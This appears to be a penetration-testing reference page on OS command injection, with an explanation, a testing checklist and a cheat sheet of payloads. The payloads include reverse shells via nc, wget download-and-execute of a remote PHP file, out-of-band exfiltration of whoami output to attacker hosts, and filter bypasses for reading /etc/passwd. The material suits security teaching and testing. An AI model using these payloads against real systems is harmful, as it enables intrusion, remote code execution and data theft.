# Command Injection

### What is it?

Command injection is a vulnerability that allows an attacker to manipulate an application to execute arbitrary system commands on the server. This occurs when an application passes unsafe data, often user input, to a system shell.

**A simple example**

A vulnerable web application might take a path from a query parameter and use it to read a file, like so:

```shellscript
$file = $_GET['file'];
system("cat /var/www/html/$file");
```

If an attacker uses a payload such as `; ls -la` in the `file` parameter, they can make the application execute an additional command that lists all files in the current directory.

The server then executes the `cat` command and the `ls` command and the attacker receives a list of all files in the current directory.

Command injection can often lead to:

* Remote code execution
* Denial of Service
* Data breach
* Privilege escalation

**Other learning resources:**

* PortSwigger: [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
* OWASP: [https://owasp.org/www-community/attacks/Command\_Injection](https://owasp.org/www-community/attacks/Command_Injection)

**Writeups:**

* Bullets

### Checklist

* [ ] Determine the technology stack: Which operating system and server software are in use?
* [ ] Identify potential injection points: URL parameters, form fields, HTTP headers, etc.
* [ ] Test for simple injections with special characters like ;, &&, ||, and |. Test for injection within command arguments.
* [ ] Test for blind command injection, where output is not returned in the response. If output isn't directly visible, try creating outbound requests (e.g. using ping or curl).
* [ ] Try to escape from any restriction mechanisms, like quotes or double quotes.
* [ ] Test with a list of potentially dangerous functions/methods (like exec(), system(), passthru() in PHP, or exec, eval in Node.js).
* [ ] Test for command injection using time delays (ping -c localhost).
* [ ] Test for command injection using &&, ||, and ;.
* [ ] Test with common command injection payloads, such as those from PayloadsAllTheThings.
* [ ] If there's a filter in place, try to bypass it using various techniques like encoding, command splitting, etc.

### Exploitation

Basic command chaining

```shellscript
; ls -la
```

Using logic operators

```shellscript
&& ls -la
```

Commenting out the rest of a command

```shellscript
; ls -la #
```

Using a pipe for command chaining

```shellscript
| ls -la
```

Testing for blind injection

```shellscript
; sleep 10
; ping -c 10 127.0.0.1
& whoami > /var/www/html/whoami.txt &
```

Out-of-band testing

```shellscript
& nslookup webhook.site/<id>?`whoami` &
```

## Command Injection

{% hint style="info" %}
Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application.
{% endhint %}

```shellscript
# For detection, try to concatenate another command to param value
&
;
Newline (0x0a or \n)
&&
|
||
# like: https://target.com/whatever?param=1|whoami

# Blind (Time delay)
https://target.com/whatever?param=x||ping+-c+10+127.0.0.1||

# Blind (Redirect)
https://target.com/whatever?param=x||whoami>/var/www/images/output.txt||

# Blind (OOB)
https://target.com/whatever?param=x||nslookup+burp.collaborator.address||
https://target.com/whatever?param=x||nslookup+`whoami`.burp.collaborator.address||

# Common params:
cmd
exec
command
execute
ping
query
jump
code
reg
do
func
arg
option
load
process
step
read
function
req
feature
exe
module
payload
run
print

# Useful Commands: Linux
whoami
ifconfig
ls
uname -a

# Useful Commands: Windows
whoami
ipconfig
dir
ver

# Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id 
ls|id; ls |id; ls| id; ls | id 
ls&&id; ls &&id; ls&& id; ls && id 
ls&id; ls &id; ls& id; ls & id 
ls %0A id

# Time Delay Commands
& ping -c 10 127.0.0.1 &

# Redirecting output
& whoami > /var/www/images/output.txt &

# OOB (Out Of Band) Exploitation
& nslookup attacker-server.com &
& nslookup `whoami`.attacker-server.com &

# WAF bypasses
vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>
vuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/payload; chmod 744 /tmp/payload; /tmp/payload

# Some filter bypasses
cat /etc/passwd
cat /e”t”c/pa”s”swd
cat /’e’tc/pa’s’ swd
cat /etc/pa??wd
cat /etc/pa*wd
cat /et’ ‘c/passw’ ‘d
cat /et$()c/pa$()$swd
{cat,/etc/passwd}
cat /???/?????d

# Tools
https://github.com/commixproject/commix
```
